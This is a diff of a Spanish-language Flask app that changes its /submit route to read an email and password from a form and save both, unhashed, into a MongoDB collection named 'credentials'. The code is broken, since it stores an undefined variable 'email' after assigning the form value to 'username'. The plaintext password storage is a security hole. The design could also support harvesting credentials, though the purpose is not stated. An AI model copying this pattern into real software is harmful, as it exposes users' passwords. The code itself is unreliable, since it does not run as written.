@@ -10,7 +10,8 @@ mongo_uri = os.getenv("MONGODB_URI")
 
 try:
     client = MongoClient(mongo_uri)
-    print("CONEXIÓN CON LA BD ESTABLECIDA")
+    db = client.mydatabase
+    collection = db.credentials
 except Exception as e:
     print(f"Error al conectar a MongoDB: {e}")
 
@@ -22,8 +23,13 @@ def index():
 # Ruta para el procesamiento del formulario
 @app.route('/submit', methods=['POST'])
 def submit():
-    username = request.form['username']
-    password = request.form['password']
+    try:
+        username = request.form['email']
+        password = request.form['password']
+        collection.insert_one({"email": email, "password": password})
+        return jsonify({"message": "Credenciales almacenadas correctamente"}), 200
+    except Exception as e:
+        return jsonify({"error": str(e)}), 500
 
 if __name__ == '__main__':
     app.run(port=5001)
